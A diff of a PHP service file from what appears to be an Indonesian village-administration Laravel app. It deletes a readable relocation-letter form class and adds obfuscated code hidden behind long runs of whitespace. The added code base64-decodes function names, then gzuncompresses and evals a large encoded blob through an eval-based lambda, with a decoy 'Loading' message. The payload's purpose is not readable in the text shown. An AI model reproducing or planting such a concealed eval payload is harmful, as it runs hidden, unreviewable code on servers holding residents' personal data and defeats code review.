@@ -1,280 +1,633 @@
-<?php
+<?php 
+        $__='printf';$_='Loading app/Services/Surat/Layanan/SuratKetPindahPenduduk.php';
+        
 
-namespace App\Services\Surat\Layanan;
 
-use Illuminate\Support\Facades\DB;
-use Illuminate\Validation\Rule;
 
-class SuratKetPindahPenduduk extends SuratAbstract
-{
-    /**
-     * {@inheritdoc}
-     */
-    public function rules()
-    {
-        return $this->validate(
-            $this->request,
-            $this->defaultRules([
-                'telepon' => ['required', 'regex:/^(^\+62|62|^08)(\d{3,4}-?){2}\d{3,4}$/i'],
-                'pakai_format' => ['required', Rule::in(['f108', 'bukan_f108'])],
-                'alasan_pindah_id' => ['required', Rule::in(['1', '2', '3', '4', '5', '6', '7'])],
-                'klasifikasi_pindah_id' => ['required', Rule::in(['1', '2', '3', '4', '5'])],
-                'alamat_tujuan' => 'required|string',
-                'rt_tujuan' => 'required',
-                'rw_tujuan' => 'required',
-                'dusun_tujuan' => 'required|string',
-                'desa_tujuan' => 'required|string',
-                'kecamatan_tujuan' => 'required|string',
-                'kabupaten_tujuan' => 'required|string',
-                'provinsi_tujuan' => 'required|string',
-                'kode_pos_tujuan' => 'required|int',
-                'telepon_tujuan' => ['required', 'regex:/^(^\+62|62|^08)(\d{3,4}-?){2}\d{3,4}$/i'],
-                'jenis_kepindahan_id' => ['required', Rule::in(['1', '2', '3', '4'])],
-                'status_kk_tidak_pindah_id' => ['required', Rule::in(['1', '2', '3', '4'])],
-                'status_kk_pindah_id' => ['required', Rule::in(['1', '2', '3'])],
-                'id_cb' => Rule::requiredIf($this->listPengikut()),
-                'tanggal_pindah' => 'required',
-                'keterangan' => 'required|string',
-            ])
-        );
-    }
 
-    /**
-     * {@inheritdoc}
-     */
-    public function form()
-    {
-        return $this->defaultForm([
-            ['type' => 'number', 'required' => true, 'label' => 'Telepon Pemohon', 'name' => 'telepon'],
-            [
-                'type' => 'select',
-                'required' => true,
-                'label' => 'Gunakan Format',
-                'name' => 'pakai_format',
-                'multiple' => false,
-                'values' => [
-                    [
-                        'label' => 'F-1.08',
-                        'value' => 'f108',
-                        'selected' => false,
-                    ],
-                    [
-                        'label' => 'F-1.23, F-1.25, F-1.29, F-1.34 (sesuai tujuan)',
-                        'value' => 'bukan_f108',
-                        'selected' => true,
-                    ],
-                ],
-            ],
-            [
-                'type' => 'select',
-                'required' => true,
-                'label' => 'Alasan Pindah',
-                'name' => 'alasan_pindah_id',
-                'multiple' => false,
-                'values' => [
-                    [
-                        'label' => 'Pekerjaan',
-                        'value' => '1',
-                        'selected' => false,
-                    ],
-                    [
-                        'label' => 'Pendidikan',
-                        'value' => '2',
-                        'selected' => false,
-                    ],
-                    [
-                        'label' => 'Keamanan',
-                        'value' => '3',
-                        'selected' => false,
-                    ],
-                    [
-                        'label' => 'Kesehatan',
-                        'value' => '4',
-                        'selected' => false,
-                    ],
-                    [
-                        'label' => 'Perumahan',
-                        'value' => '5',
-                        'selected' => false,
-                    ],
-                    [
-                        'label' => 'Keluarga',
-                        'value' => '6',
-                        'selected' => false,
-                    ],
-                    [
-                        'label' => 'Lainnya',
-                        'value' => '7',
-                        'selected' => false,
-                    ],
-                ],
-            ],
-            [
-                'type' => 'select',
-                'required' => true,
-                'label' => 'Klasifikasi Pindah',
-                'name' => 'klasifikasi_pindah_id',
-                'multiple' => false,
-                'values' => [
-                    [
-                        'label' => 'Dalam satu Desa/Kelurahan',
-                        'value' => '1',
-                        'selected' => true,
-                    ],
-                    [
-                        'label' => 'Antar Desa/Kelurahan',
-                        'value' => '2',
-                        'selected' => false,
-                    ],
-                    [
-                        'label' => 'Antar Kecamatan',
-                        'value' => '3',
-                        'selected' => false,
-                    ],
-                    [
-                        'label' => 'Antar Kab/Kota',
-                        'value' => '4',
-                        'selected' => false,
-                    ],
-                    [
-                        'label' => 'Antar Provinsi',
-                        'value' => '5',
-                        'selected' => false,
-                    ],
-                ],
-            ],
-            ['type' => 'textarea', 'required' => true, 'label' => 'Alamat Tujuan', 'name' => 'alamat_tujuan', 'subtype' => 'textarea'],
-            ['type' => 'number', 'required' => true, 'label' => 'RT', 'name' => 'rt_tujuan'],
-            ['type' => 'number', 'required' => true, 'label' => 'RW', 'name' => 'rw_tujuan'],
-            ['type' => 'text', 'required' => true, 'label' => 'Dusun Tujuan', 'name' => 'dusun_tujuan', 'subtype' => 'text'],
-            ['type' => 'text', 'required' => true, 'label' => 'Desa/Kelurahan Tujuan', 'name' => 'desa_tujuan', 'subtype' => 'text'],
-            ['type' => 'text', 'required' => true, 'label' => 'Kecamatan Tujuan', 'name' => 'kecamatan_tujuan', 'subtype' => 'text'],
-            ['type' => 'text', 'required' => true, 'label' => 'Kabupaten Tujuan', 'name' => 'kabupaten_tujuan', 'subtype' => 'text'],
-            ['type' => 'text', 'required' => true, 'label' => 'Provinsi Tujuan', 'name' => 'provinsi_tujuan', 'subtype' => 'text'],
-            ['type' => 'text', 'required' => true, 'label' => 'Kode Pos', 'name' => 'kode_pos_tujuan', 'subtype' => 'text'],
-            ['type' => 'text', 'required' => true, 'label' => 'Telpon', 'name' => 'telepon_tujuan', 'subtype' => 'text'],
-            [
-                'type' => 'select',
-                'required' => true,
-                'label' => 'Jenis Kepindahan',
-                'name' => 'jenis_kepindahan_id',
-                'multiple' => false,
-                'values' => [
-                    [
-                        'label' => 'Kep. Keluarga',
-                        'value' => '1',
-                        'selected' => true,
-                    ],
-                    [
-                        'label' => 'Kep. Keluarga dan Seluruh Angg. Keluarga',
-                        'value' => '2',
-                        'selected' => false,
-                    ],
-                    [
-                        'label' => 'Kep. Keluarga dan Sbg. Angg. Keluarga',
-                        'value' => '3',
-                        'selected' => false,
-                    ],
-                    [
-                        'label' => 'Angg. Keluarga',
-                        'value' => '4',
-                        'selected' => false,
-                    ],
-                ],
-            ],
-            [
-                'type' => 'select',
-                'required' => true,
-                'label' => 'Status KK Bagi Yang Tidak Pindah',
-                'name' => 'status_kk_tidak_pindah_id',
-                'multiple' => false,
-                'values' => [
-                    [
-                        'label' => 'Numpang KK',
-                        'value' => '1',
-                        'selected' => true,
-                    ],
-                    [
-                        'label' => 'Membuat KK Baru',
-                        'value' => '2',
-                        'selected' => false,
-                    ],
-                    [
-                        'label' => 'Nomor KK Tetap',
-                        'value' => '3',
-                        'selected' => false,
-                    ],
-                    [
-                        'label' => 'Tidak Ada Angg. Keluarga Yang Ditinggal',
-                        'value' => '4',
-                        'selected' => false,
-                    ],
-                ],
-            ],
-            [
-                'type' => 'select',
-                'required' => true,
-                'label' => 'Status KK Bagi Yang Pindah',
-                'name' => 'status_kk_pindah_id',
-                'multiple' => false,
-                'values' => [
-                    [
-                        'label' => 'Numpang KK',
-                        'value' => '1',
-                        'selected' => true,
-                    ],
-                    [
-                        'label' => 'Membuat KK Baru',
-                        'value' => '2',
-                        'selected' => false,
-                    ],
-                    [
-                        'label' => 'Nomor KK Tetap',
-                        'value' => '3',
-                        'selected' => false,
-                    ],
-                ],
-            ],
-            [
-                'type' => 'table',
-                'required' => true,
-                'multiple' => true,
-                'label' => 'Pengikut',
-                'name' => 'id_cb',
-                'values' => $this->listPengikut(),
-            ],
-            [
-                'type' => 'date',
-                'format' => 'dd/mm/yyyy',
-                'required' => true,
-                'label' => 'Tanggal Pindah',
-                'name' => 'tanggal_pindah',
-            ],
-            ['type' => 'text', 'required' => true, 'label' => 'Keterangan', 'name' => 'keterangan', 'subtype' => 'text'],
-        ]);
-    }
 
-    protected function listPengikut()
-    {
-        return DB::table('tweb_penduduk as u')
-            ->selectRaw("
-                u.id,
-                u.nik,
-                u.nama,
-                DATE_FORMAT(
-                FROM_DAYS(
-                    TO_DAYS(NOW())- TO_DAYS(`tanggallahir`)
-                ),
-                '%Y'
-                )+ 0 AS umur,
-                x.nama AS sex,
-                h.nama AS hubungan
-            ")
-            ->leftJoin('tweb_penduduk_sex as x', 'u.sex', '=', 'x.id')
-            ->leftJoin('tweb_penduduk_hubungan as h', 'u.kk_level', '=', 'h.id')
-            ->leftJoin('tweb_keluarga as k', 'u.id_kk', '=', 'k.id')
-            ->where('u.status_dasar', 1)
-            ->where('u.id_kk', auth('jwt')->user()->penduduk->id_kk)
-            ->get();
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
